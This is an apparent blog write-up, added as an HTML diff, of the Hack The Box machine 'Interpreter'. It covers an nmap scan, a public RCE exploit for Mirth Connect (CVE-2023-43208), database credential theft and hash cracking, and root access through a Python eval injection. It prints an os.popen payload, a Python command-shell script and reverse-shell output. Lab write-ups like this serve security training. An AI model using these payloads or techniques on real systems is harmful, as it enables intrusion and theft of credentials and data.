@@ -1,0 +1,313 @@
+
+<!DOCTYPE html>
+<html lang="it">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HTB - Season10 - Writeups - Interpreter</title>
+    <link rel="stylesheet" href="/static/style.css">
+    <link rel="shortcut icon" href="/static/images/favicon.png" type="image/x-icon">
+</head>
+<body>
+    <canvas class="matrix-bg" id="matrix"></canvas>
+
+    <header>
+        <div class="header-content">
+            <div class="terminal-prompt">k0d14k@kali:~#</div>
+            <div class="img-text">
+                <img src="/static/images/avatar.png" width="100rem">
+                <div class="text">
+                    <h1>Luca Puzzoni<span class="typing-cursor">_</span></h1>
+                    <p class="subtitle">Softwate Security Consultant | Hacker | Full Stack Web Developer</p>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <nav>
+        <ul>
+            <li><a href="/">Home</a></li>
+            <li><a href="/#about">Whoami</a></li>
+            <li><a href="/#skills">Skills</a></li>
+            <li><a href="/#projects">Projects</a></li>
+            <li><a href="/#contact">Contacts</a></li>
+        </ul>
+    </nav>
+
+    <button id="backToTop">↑</button>
+
+    <main style="text-align: justify;">     
+        <img src="images/interpreter.png" alt="500rem">   
+        <h1>Interpreter - HTB Season 10</h1>
+
+        <p>
+          <b>Categories</b>: #CVE-2023-43208, #ExLangInjection
+        </p>
+
+        <hr>
+
+        <section id="index">
+            <h2>ls -l index</h2>
+            <div class="project">
+                <!--USED BY THE LISTER-->
+                <span id="time" hidden>26 Apr 14 01:10</span>
+            </div>
+        </section>      
+
+        <section id="tcp-scan">
+            <h2>cat tcp-scan</h2>
+            <div class="code">
+                # Nmap 7.98 scan initiated Fri Feb 27 12:16:03 2026 as: /usr/lib/nmap/nmap --privileged -oA nmap-top-ports 10.129.8.61 <br>
+                Nmap scan report for 10.129.8.61 <br>
+                Host is up (0.049s latency). <br>
+                Not shown: 996 closed tcp ports (reset) <br>
+                PORT     STATE SERVICE <br>
+                22/tcp   open  ssh <br>
+                80/tcp   open  http <br>
+                443/tcp  open  https <br>
+                <br>
+                # Nmap done at Fri Feb 27 12:16:12 2026 -- 1 IP address (1 host up) scanned in 8.45 seconds
+            </div>
+
+            <p>From the TCP port analysis I notice that a website is exposed:</p>
+
+            <img src="images/Pasted image 20260227150917.png" width="1000rem">
+
+            <p>
+                Since this is my first time dealing with <span class="highlight">Mirth Connect Administrator</span>, and noticing the option to download a 
+                connection certificate, I download the file to examine it and discover version <span class="highlight">4.4.0</span>.
+            </p>
+
+            <div class="code">
+                &lt;jnlp codebase="http://10.129.8.61:80" version="4.4.0">
+                &lt;information>
+                &nbsp;&nbsp;&nbsp;&lt;title>Mirth Connect Administrator 4.4.0&lt;/title>
+                &nbsp;&nbsp;&nbsp;&lt;vendor>NextGen Healthcare&lt;/vendor>
+                &nbsp;&nbsp;&nbsp;&lt;homepage href="http://www.nextgen.com"/>
+                &nbsp;&nbsp;&nbsp;&lt;description>Open Source Healthcare Integration Engine&lt;/description>
+                &nbsp;&nbsp;&nbsp;&lt;icon href="images/NG_MC_Icon_128x128.png"/>         
+                &nbsp;&nbsp;&nbsp;...
+            </div>
+        </section>
+
+        <section id="foothold">
+            <h2>cat foothold</h2>
+            <p>
+                The initial access is actually very straightforward - searching Google for <span class="highlight">Mirth Connect Administrator 4.4.0 CVE</span> 
+                immediately returns an Unauthenticated RCE with <a target="_blank" href="https://github.com/jakabakos/CVE-2023-43208-mirth-connect-rce-poc">CVE-2023-43208</a>. 
+                Running this script as shown below gives me the first reverse shell right away.
+            </p>
+
+            <img src="images/Pasted image 20260227151607.png" width="1000rem">
+
+            <p>However, searching for users with a shell, I notice that my <span class="highlight">mirth</span> user is actually a transitional user:</p>
+
+            <div class="code">
+                cat /etc/passwd | grep /bin/bash <br>
+                root:x:0:0:root:/root:/bin/bash <br>
+                sedric:x:1000:1000:sedric,,,:/home/sedric:/bin/bash <br>
+            </div>
+            
+            <p>Our actual target is the user <span class="highlight">sedric</span>.</p>
+        </section>
+
+        <section id="lateral-movement">
+            <h2>cat lateral-movement</h2>
+            <p>
+                Through the <span class="highlight">mirth</span> user we actually have access to several configuration files of the web application, 
+                most notably <span class="highlight">mirth.properties</span>.
+            </p>
+
+            <p>Inside this file we find, among other settings, the database username and password:</p>
+
+            <div class="code">
+                ... <br>
+                database.url = jdbc:mariadb://localhost:3306/mc_bdd_prod <br>
+                ... <br>
+                # database credentials <br>
+                database.username = mirthdb <br>
+                database.password = MirthPass123! <br>
+                ...
+            </div>
+
+            <p>We then run <span class="highlight">mysqldump</span> to extract the database contents:</p>
+
+            <div class="code">
+                mysqldump -umirthdb -pMirthPass123! mc_bdd_prod > dump
+            </div>
+
+            <p>
+                Inside this file, in the <span class="highlight">PERSON</span> and <span class="highlight">PERSON_PASSWORD</span> tables, I find the username 
+                <span class="highlight">sedric</span> and a password hash which, according to Google's AI mode, should be:
+            </p>
+
+            <div class="code">
+                Algorithm: PBKDF2 with HMAC-SHA256. <br>
+                Iterations: 600,000 rounds. <br>
+                Salt: 8 random bytes. <br>
+                Format: Base64.
+            </div>
+
+            <p>I prepare a <span class="highlight">hash</span> file containing the string and the round count:</p>
+
+            <div class="code">
+                sha256:600000:u/+LBBOUnad:iyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w==
+            </div>
+
+            <p>And run <span class="highlight">hashcat</span> with the appropriate module:</p>
+
+            <div class="code">hashcat -a 0 -m 10900 hash /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt</div>
+
+            <p>I then log in via SSH as <span class="highlight">sedric</span> and retrieve the first flag:</p>
+
+            <div class="code">
+                ssh sedric@10.129.8.61 <br>
+                <br>
+                ... <br>
+                sedric@interpreter:~$ id;whoami;hostname <br>
+                uid=1000(sedric) gid=1000(sedric) groups=1000(sedric) <br>
+                sedric <br>
+                interpreter <br>
+                sedric@interpreter:~$ cat user.txt  <br>
+                031e4d794db84c5768a398bc461cc5e3 <br>
+                sedric@interpreter:~$ 
+            </div>
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>cat privilege-escalation</h2>
+            <p>
+                Once logged in as <span class="highlight">sedric</span>, I notice the absence of the <span class="highlight">sudo</span> command and fall back 
+                on <span class="highlight">linpeas.sh</span> to run a preliminary analysis:
+            </p>
+            
+            <div class="code">
+                sedric@interpreter:/tmp$ ./linpeas.sh | tee lin-res.txt<br>
+                <br>
+                ... <br>
+                root&nbsp;&nbsp;&nbsp;&nbsp;3551&nbsp;0.0&nbsp;0.8 187352 33704 ?&nbsp;&nbsp;&nbsp;&nbsp;Ssl&nbsp;05:38&nbsp; 0:03 /usr/bin/python3 /usr/local/bin/notif.py <br>
+                ... <br>
+                ╔══════════╣ Active Ports <br>
+                ╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#open-ports <br>
+                ══╣ Active Ports (ss) <br>
+                tcp&nbsp; LISTEN 0&nbsp;&nbsp;&nbsp;5&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0.0.0.0:1234&nbsp;&nbsp;&nbsp; 0.0.0.0:* <br>
+                tcp&nbsp; LISTEN 0&nbsp;&nbsp;&nbsp;256&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0.0.0.0:6661&nbsp;&nbsp;&nbsp; 0.0.0.0:* <br>
+                tcp&nbsp; LISTEN 0&nbsp;&nbsp;&nbsp;128&nbsp;&nbsp;&nbsp;&nbsp;127.0.0.1:54321&nbsp;&nbsp;&nbsp;0.0.0.0:*<br>
+                tcp&nbsp; LISTEN 0&nbsp;&nbsp;&nbsp;80&nbsp;&nbsp;&nbsp;&nbsp; 127.0.0.1:3306&nbsp;&nbsp;&nbsp; 0.0.0.0:*<br>
+                tcp&nbsp; LISTEN 0&nbsp;&nbsp;&nbsp;128&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0.0.0.0:22&nbsp;&nbsp;&nbsp;&nbsp; 0.0.0.0:* <br>
+                tcp&nbsp; LISTEN 0&nbsp;&nbsp;&nbsp;50&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0.0.0.0:80&nbsp;&nbsp;&nbsp;&nbsp; 0.0.0.0:* <br>
+                tcp&nbsp; LISTEN 0&nbsp;&nbsp;&nbsp;50&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0.0.0.0:443&nbsp;&nbsp;&nbsp;&nbsp;0.0.0.0:* <br>
+                tcp&nbsp; LISTEN 0&nbsp;&nbsp;&nbsp;128&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [::]:22&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[::]:* 
+            </div>
+
+            <p>
+                I notice that <span class="highlight">root</span> is running a Python file I have read permissions on, and that this file listens on port 
+                <span class="highlight">54321</span> on <span class="highlight">localhost</span>.
+            </p>
+
+            <p>
+                After dumping the Python file I understand it is a notification bot, and I notice the presence of an Expression Language Injection vulnerability. 
+                The vulnerable code section is reported below:
+            </p>
+            
+            <div class="code">
+                def template(first, last, sender, ts, dob, gender): <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pattern = re.compile(r"^[a-zA-Z0-9._'\"(){}=+/]+$") <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for s in [first, last, sender, ts, dob, gender]: <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if not pattern.fullmatch(s): <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return "[INVALID_INPUT]" <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# DOB format is DD/MM/YYYY <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;try: <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;year_of_birth = int(dob.split('/')[-1]) <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if year_of_birth < 1900 or year_of_birth > datetime.now().year: <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return "[INVALID_DOB]" <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;except: <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return "[INVALID_DOB]" <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;template = f"Patient {first} {last} ({gender}), {{datetime.now().year - year_of_birth}} years old, received from {sender} at {ts}" <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;try: <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return eval(f"f'''{template}'''") <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;except Exception as e: <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return f"[EVAL_ERROR] {e}"
+            </div>
+
+            <div class="code">
+                As we can see, the vulnerability is intentional and is handled only through a regular expression that effectively filters only the space and 
+                <span class="highlight">-</span> characters.
+            </div>
+
+            <p>The API accepts a <span class="highlight">POST</span> request with an XML object of the following format:</p>
+
+            <div class="code">
+                &lt;patient> <br>
+                &nbsp;&nbsp;&nbsp;&lt;firstname>kodiak&lt;/firstname> <br>
+                &nbsp;&nbsp;&nbsp;&lt;lastname>kodiak&lt;/lastname> <br>
+                &nbsp;&nbsp;&nbsp;&lt;sender_app>{ PAYLOAD BETWEEN THE BRACES }&lt;/sender_app> <br>
+                &nbsp;&nbsp;&nbsp;&lt;timestamp>01/01/1900&lt;/timestamp> <br>
+                &nbsp;&nbsp;&nbsp;&lt;gender>M&lt;/gender> <br>
+                &lt;/patient>
+            </div>
+
+            <p>Since the <span class="highlight">os</span> module is already imported in the script, we can import the <span class="highlight">base64</span> 
+                module to avoid having to pass spaces:</p>
+
+            <div class="code">
+                os.popen(__import__(base64).b64decode('[CMD in base 64]').decode()).read()
+            </div>
+
+            <p>This file, once saved on the target machine, allows running a mini shell as root:</p>
+            
+            <div class="code">
+                import requests, base64 <br>
+                <br>
+                while True: <br>
+                &nbsp;&nbsp;&nbsp;cmd = input("$: ") <br>
+                &nbsp;&nbsp;&nbsp;if cmd == "exit": <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exit(0) <br>
+                <br>
+                &nbsp;&nbsp;&nbsp;payload = base64.b64encode(input("$: ").encode('ascii')).decode() <br>
+                &nbsp;&nbsp;&nbsp;data = """ <br>
+                &nbsp;&nbsp;&nbsp;&lt;patient> <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;firstname>kodiak&lt;/firstname> <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;lastname>kodiak&lt;/lastname> <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;sender_app>{os.popen(__import__('base64').b64decode('""" + payload + """').decode()).read()}&lt;/sender_app> <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;timestamp>12345&lt;/timestamp> <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;birth_date>01/01/1900&lt;/birth_date> <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;gender>M&lt;/gender> <br>
+                &nbsp;&nbsp;&nbsp;&lt;/patient>""" <br>
+                <br>
+                &nbsp;&nbsp;&nbsp;r = requests.post(url="http://127.0.0.1:54321/addPatient", data=data, headers={'Content-Type': 'application/xml'}) <br>
+                <br>
+                &nbsp;&nbsp;&nbsp;print(r.text.split("from")[1].split("at")[0].strip())
+            </div>
+
+            <p>This is of course just a trick to send commands more conveniently, and through it we can also open a classic reverse shell:</p>
+
+            <div class="code">
+                nc -nvlp 1235 <br>
+                listening on [any] 1235 ... <br>
+                connect to [10.10.15.65] from (UNKNOWN) [10.129.8.61] 54400 <br>
+                id;whoami;hostname <br>
+                uid=0(root) gid=0(root) groups=0(root) <br>
+                root <br>
+                interpreter <br>
+                cat /root/root.txt <br>
+                f9f5f96a5758c84445f081703ff054ac
+            </div>
+        </section>
+
+        <section id="flags">
+            <h2>cat flags</h2>
+            <h3><b>User Flag:</b> 031e4d794db84c5768a398bc461cc5e3</h3>
+            <h3><b>Root Flag:</b> f9f5f96a5758c84445f081703ff054ac</h3>
+        </section>
+    </main>
+
+
+    <footer>
+        <p>Built with GitHub Pages —— Securing the web, one bug at a time.</p>
+        <p>&copy; 2025 K0D14K</p>
+    </footer>
+
+    <script src="/static/script.js"></script>
+    <script> lister() </script>
+</body>
